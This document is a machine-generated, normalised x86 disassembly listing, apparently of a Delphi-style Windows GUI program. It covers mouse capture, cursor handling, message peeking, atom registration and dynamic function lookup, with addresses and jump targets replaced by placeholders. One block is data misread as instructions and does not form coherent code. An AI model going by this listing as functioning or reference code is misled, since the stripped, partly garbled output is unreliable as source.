call sub_443b94
test eax eax
je r-xdata
push ebp
call sub_444e34
pop ecx
push ebp
call sub_444eb4
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_444db8
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
sub_445074
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_442c20
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_442c20
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_444d68
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_444d68
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_445104
push ebp
mov ebp esp
add esp 0xffffffb8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x48 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4454dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
cmp eax 0x202
jg r-xdata
sub eax 0x203
je r-xdata
je r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069ec
lea edx [ ebp - 0x44 ]
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
call sub_443b94
mov esi eax
test esi esi
je r-xdata
sub eax 0xae2d
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
sub eax 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32 ] 0x0
je r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
mov edx ebx
mov esi [ ebp - 0x4 ]
mov eax [ esi + 0x34 ]
call [ esi + 0x30 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_444b38
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069ec
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443b94
mov esi eax
test esi esi
je r-xdata
lea eax [ ebp - 0xc ]
push eax
call GetCursorPos
lea ecx [ ebp - 0x44 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43a0b4
mov eax [ ebp - 0x44 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x40 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4454e3
lea eax [ ebp - 0x48 ]
call sub_403ee8
retn
mov edx ebx
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x34 ]
call [ ebx + 0x30 ]
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebx + 0x8 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
cmp [ ebp - 0x10 ] 0x14
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_440d58
cmp eax [ ebx + 0x4 ]
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
dec eax
je r-xdata
call sub_438dd0
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43b270
jmp r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403ee8
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
call sub_444fec
jmp r-xdata
mov edi [ esi + 0x4 ]
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_43f888
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_444bec
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
call sub_4069ec
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x44 ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x40 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_445074
pop ecx
mov eax [ ebp - 0x4 ]
call sub_444bec
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebx + 0x8 ]
call sub_4069ec
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443b94
mov esi eax
test esi esi
je r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
xor edx edx
mov eax edi
call sub_43a490
jmp r-xdata
mov eax edi
call sub_456d1c
jmp r-xdata
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_443b94
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_439f10
lea ecx [ ebp - 0x20 ]
mov edx esi
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x20 ]
sub eax [ esi + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ esi + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ esi + 0x48 ]
mov edx [ ebp - 0x18 ]
sub edx [ ebp - 0x20 ]
sub eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ esi + 0x4c ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x48 ]
mov eax esi
call sub_43a570
mov edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
add eax 0x38
call sub_403f3c
mov eax [ ebx + 0x8 ]
lea edi [ eax + 0x18 ]
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
jmp r-xdata
sub eax 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
cmp [ ebp - 0x10 ] 0x2
jne r-xdata
lea ecx [ ebp - 0xc ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_444ad8
jmp r-xdata
mov eax [ esi + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_458464
push eax
call SetCursor
mov [ ebx + 0xc ] 0x1
jmp r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
call sub_440d58
push eax
lea eax [ ebp - 0x3c ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x9b ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xc4 ]
or ecx 0xffffffff
xor edx edx
call sub_43ac18
jmp r-xdata
sub_4454ec
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403168
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_445660
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_44557c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_445638
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403188
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_4455e0
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_445610
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_406ad8
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_445638
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4455ac
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_445660
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_4455c4
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_4455e0
pop ebx
retn
mov eax ebx
call sub_445610
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_4456c4
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_44582a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_445948
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44592c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44592c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax [ esp ]
and eax 0xfffffff4
xor edx edx
mov dl bl
movzx edx [ edx + rw-data ]
or eax edx
mov [ esp ] eax
sub_445a38
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403198
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
mov eax [ eax ]
call sub_403198
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
call sub_403198
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_403198
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403ee8
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
mov eax rw-data
call sub_403ee8
cmp [ rw-data ] 0x0
je r-xdata
retn
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_445ac0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor eax eax
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_445c38
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
call GetCurrentProcessId
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea edx [ ebp - 0xc ]
xor ecx ecx
mov eax r-xdata
call sub_408da0
mov edx [ ebp - 0x4 ]
mov eax rw-data
call sub_403f3c
mov eax [ rw-data ]
call sub_4043a8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x1c ] 0x0
call GetCurrentThreadId
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] 0x0
lea edx [ ebp - 0x20 ]
mov ecx 0x1
mov eax r-xdata
call sub_408da0
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403f3c
mov eax [ rw-data ]
call sub_4043a8
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
mov eax [ rw-data ]
call sub_4043a8
push eax
call RegisterWindowMessageA
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4142ac
mov [ rw-data ] eax
call sub_4456c4
mov dl 0x1
mov eax [ r-xdata ]
call sub_4454ec
mov [ rw-data ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_457cf8
mov edx [ rw-data ]
mov [ edx ] eax
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_458e6c
mov edx [ rw-data ]
mov [ edx ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov dl 0x1
call sub_45aa54
mov ecx r-xdata
mov edx sub_43762c
mov eax [ r-xdata ]
call sub_413a10
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445c3f
lea eax [ ebp - 0x10 ]
call sub_403ee8
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
sub_445c8a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_445ceb
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445cf2
retn
mov eax rw-data
call sub_40d3ac
call sub_445a38
mov eax rw-data
mov ecx 0x16
mov edx [ r-xdata ]
call sub_404970
mov eax rw-data
call sub_403ee8
mov eax rw-data
call sub_403ee8
sub_445cf4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_445d7a
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_445d81
retn
call GetVersion
and eax 0xff
cmp ax 0x4
setae [ rw-data ]
call sub_445ac0
mov eax [ r-xdata ]
call sub_413884
mov eax [ r-xdata ]
call sub_413924
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_4138d0
sub_445eed
pop esi
inc esp
add [ ebx ] al
adc [ ecx + eax * 2 + 0x63 ] dl
je r-xdata
ficomp [ edi + 0x44 ]
outsd
outsb
dec esp
imul esi [ ebx + 0x74 ] 0x74617453
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add ah ch
pop esi
inc esp
add [ eax ] cl
popad
jae r-xdata
inc ecx
add [ esi + eax * 2 + 0x41 ] dl
add [ eax + 0x4800419e ] ah
inc ecx
add al al
mov eax [ 0x33ec0041 ]
inc eax
add [ ebx + ebx * 4 ] dl
inc ecx
add ah dh
xor eax [ eax ]
call 0x30449fb4
xor [ eax ] eax
dec esp
add [ eax ] ch
add [ eax ] al
loopne r-xdata
pop edi
inc esp
outsd
jb r-xdata
inc esp
add [ eax ] bh
inc edi
inc ecx
add al cl
add [ ecx + esi + 0x40 ] cl
add [ edi ] ah
popad
insb
or esp [ ecx + 0x73 ]
push ebx
jne r-xdata
popfd
jo r-xdata
xor [ eax ] eax
and al 0x67
outsb
adc ah [ fs : ecx + 0x73 ]
push ebx
jne r-xdata
push 0x9eb00044
inc ecx
add [ eax - 0x27ffbe61 ] ch
mov eax [ 0xffffffff9ec00041 ]
jo r-xdata
outsb
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
or [ ecx + 0x63 ] al
je r-xdata
inc ecx
add [ eax - 0x1fffbe62 ] bh
mov eax [ 0x66b80041 ]
inc esp
add ah cl
push 0x68080044
inc esp
add [ eax + eax ] al
std
inc ecx
add al al
sahf
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_44649c
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x5c ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_41a39c
test bl bl
jle r-xdata
mov edx esi
call sub_4468b0
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_44650c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419eb0
mov edi [ esi + 0x2c ]
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebx
call sub_4465b4
sub_446540
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4464d0
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x5c ]
mov edi [ edx + 0x30 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_413f38
mov eax [ ebx + 0x5c ]
mov eax [ eax + 0x30 ]
mov ecx ebx
mov edx esi
call sub_414114
sub_446588
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ ebx + 0x58 ]
call sub_4042f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x58 ]
mov edx esi
call sub_403f3c
mov eax [ ebx + 0x5c ]
test eax eax
je r-xdata
mov edx [ eax ]
call [ edx + 0x30 ]
sub_4465b4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x5c ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
test esi esi
je r-xdata
mov edx ebx
call sub_4468b0
mov edx ebx
mov eax esi
call sub_446890
sub_4465dc
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_4465b4
sub_446608
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45b7d0
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff3
call sub_403394
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a428
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb040
call sub_437458
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_446660
push ebx
push esi
push edi
mov ebx eax
mov edi [ ebx + 0x5c ]
test edi edi
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx ebx
call sub_45b7f8
test al al
jne r-xdata
mov edx ebx
mov eax edi
mov si 0xfff0
call sub_403394
test al al
jne r-xdata
mov al 0x1
mov eax ebx
call sub_41a444
test al al
jne r-xdata
mov ecx ebx
xor edx edx
mov eax 0xb03f
call sub_437458
dec eax
je r-xdata
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4466b8
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_419a50
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebx + 0x30 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov esi eax
mov [ ebx + 0x34 ] esi
mov [ esi + 0xc ] ebx
mov [ esi + 0x8 ] sub_44683c
mov [ ebx + 0x58 ] 0x0
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_446724
push ebx
push esi
push edi
call sub_403524
mov ebx edx
mov edi eax
mov eax [ edi + 0x34 ]
call sub_403198
jmp r-xdata
mov esi [ edi + 0x30 ]
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov eax esi
call sub_414180
call sub_403198
mov eax [ edi + 0x30 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax edi
call sub_419a9c
test bl bl
jle r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_40350c
sub_446774
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov edx eax
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + esi * 4 ]
mov edx [ eax + 0x4 ]
cmp edx [ ebp - 0x8 ]
jne r-xdata
sub_4467bc
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4140f4
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_403348
mov edx edi
call sub_446540
sub_446808
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
mov eax esi
mov [ ebx + 0x38 ] eax
test eax eax
je r-xdata
mov edx [ ebx + 0x34 ]
call sub_448564
pop esi
pop ebx
retn
mov edx [ ebx + 0x34 ]
call sub_4485a8
mov edx ebx
mov eax [ ebx + 0x38 ]
call sub_419b20
sub_446848
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_419d6c
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp edi [ esi + 0x38 ]
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
xor edx edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax esi
call sub_4468b0
sub_446890
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_413eec
mov [ esi + 0x5c ] ebx
mov edx ebx
mov eax esi
call sub_419b20
pop esi
pop ebx
retn
sub_4468b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x30 ]
call sub_4141dc
test eax eax
jl r-xdata
pop esi
pop ebx
retn
xor eax eax
mov [ esi + 0x5c ] eax
sub_4468cc
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x42 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
mov edx ebx
mov eax [ ebx + 0x44 ]
call [ ebx + 0x40 ]
test [ ebx + 0x1c ] 0x10
je r-xdata
inc esi
xor edi edi
pop edi
pop esi
pop ebx
retn
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + edi * 4 ]
mov edx [ eax ]
call [ edx + 0x30 ]
inc edi
dec esi
jne r-xdata
cmp [ esi + 0x250 ] 0x0
je r-xdata
mov eax [ esi + 0x250 ]
mov edx [ eax ]
call [ edx + 0xc ]
sub_446934
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esi + 0x8 ]
call sub_451618
mov ebx eax
mov ax [ esi + 0x4 ]
mov edx ebx
call sub_449e00
mov ebp eax
test bp bp
je r-xdata
xor eax eax
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp bp [ ebx + 0x84 ]
je r-xdata
mov eax [ esp ]
mov eax [ eax + 0x30 ]
mov eax [ eax + 0x4 ]
mov ebx [ eax + edi * 4 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
jmp r-xdata
cmp [ ebx + 0x90 ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_4471dc
mov edx ebp
call sub_44723c
inc eax
je r-xdata
sub_4469c0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x4a ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x4c ]
call [ ebx + 0x48 ]
sub_4469e0
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0x52 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_446a00
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x58 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
